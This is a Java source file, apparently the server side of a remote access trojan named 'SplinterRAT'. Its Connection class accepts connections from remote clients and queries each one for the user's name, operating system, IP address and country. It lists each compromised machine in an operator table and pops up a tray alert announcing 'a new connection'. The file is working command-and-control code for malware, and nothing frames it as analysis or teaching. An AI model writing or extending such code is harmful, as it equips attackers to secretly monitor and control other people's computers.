package Connections;

import GUI.Main;
import GUI.Server.ServerGUI;
import GUI.TableUtils.Configuration.SocketType;
import Information.Action;
import Information.NetworkInformation;
import Information.SystemInformation;
import org.json.JSONObject;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableModel;
import java.awt.*;
import java.io.IOException;
import java.net.Socket;
import java.util.Objects;
import java.util.concurrent.ConcurrentHashMap;

public class Connection implements Runnable {
    private final Socket socket;
    private final ConcurrentHashMap<String, ClientHandler> dialog;

    public Connection(Socket socket, ConcurrentHashMap<String, ClientHandler> dialog) {
        if (socket == null || dialog == null) throw new IllegalArgumentException();
        this.socket = socket;
        this.dialog = dialog;
    }


    @Override
    public void run() {
        try {
            Identifier identifier = findOutWhoYouAre(socket);
            ClientHandler clientHandler = dialog.get(identifier.UUID());
            if (clientHandler == null) {
                clientHandler = new ClientHandler();
                clientHandler.addStream(identifier);
                dialog.put(identifier.UUID(), clientHandler);
                System.out.println("Connected to: " + socket.getRemoteSocketAddress());
            } else {
                clientHandler.addStream(identifier);
                int sizeOfMap = clientHandler.getSizeOfMap();
                if (sizeOfMap == SocketType.values().length) {
                    Streams mainStream = clientHandler.getStreamByName(SocketType.MAIN);
                    SystemInformation sysInfo = (SystemInformation) mainStream.sendAction(Action.SYS_INFO);
                    clientHandler.setTempSystemInformation(sysInfo);

                    // Network info
                    NetworkInformation netInfo = (NetworkInformation) mainStream.sendAction(Action.NET_INFO);
                    clientHandler.setTempNetworkInformation(netInfo);

                    // Change state of JTable add or modify existing client
                    SwingUtilities.invokeLater(() -> {
                        TableModel tableModel = Main.gui.getConnectionsTable().getModel();
                        int existingClientRow = getPositionOfExisting(identifier, tableModel); // position if exists in JTable
                        if (existingClientRow != -1) {  // change state of connection
                            tableModel.setValueAt("Connected", existingClientRow, tableModel.getColumnCount() - 1);
                        } else { // new connection
                            String[] tableRow = new String[]{
                                    identifier.UUID(),
                                    socket.getInetAddress().toString(),
                                    netInfo.USER_COUNTRY(),
                                    sysInfo.TAG_NAME(),
                                    sysInfo.USER_NAME(),
                                    sysInfo.OPERATING_SYSTEM(),
                                    "Connected"
                            };
                            DefaultTableModel defaultTableModel = (DefaultTableModel) tableModel;
                            defaultTableModel.addRow(tableRow);
                        }
                        if (ServerGUI.isNotifications() && SystemTray.isSupported())
                            displayTray(netInfo.IP(), sysInfo.OPERATING_SYSTEM());
                        Main.gui.updateNumOfConnectedClients();
                    });
                }
            }
        } catch (Exception e) {
            System.out.println("Exception on client");
            e.printStackTrace();
        }
    }

    private Identifier findOutWhoYouAre(Socket socket) {
        try {
            Streams stream = new Streams(socket);
            stream.sendString("WAU");
            String result = stream.readString();
            JSONObject jsonObject = new JSONObject(result);
            String UUID = (String) jsonObject.get("UUID");
            SocketType socketType = SocketType.valueOf((String) jsonObject.get("socket_type"));
            stream.sendString("OK");
            return new Identifier(UUID, stream, socketType, socket);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }


    public void displayTray(String ip, String operativeSystem) {
        SystemTray tray = SystemTray.getSystemTray();
        Image image = new ImageIcon(Objects.requireNonNull(getClass().getClassLoader().getResource("splinter_icon_250x250.png"))).getImage();
        TrayIcon trayIcon = new TrayIcon(image, "SplinterRAT connection!");
        trayIcon.setImageAutoSize(true);
        trayIcon.setToolTip("New connection!");
        try {
            tray.add(trayIcon);
        } catch (AWTException e) {
            throw new RuntimeException(e);
        }

        trayIcon.displayMessage("SplinterRAT has a new connection!", "New connection from " + ip + " - " + operativeSystem, TrayIcon.MessageType.INFO);
    }

    private int getPositionOfExisting(Identifier identifier, TableModel tableModel) {
        for (int i = 0; i < tableModel.getRowCount(); i++) {
            if (identifier.UUID().equals(tableModel.getValueAt(i, 0))) {
                return i;
            }
        }
        return -1;
    }
}
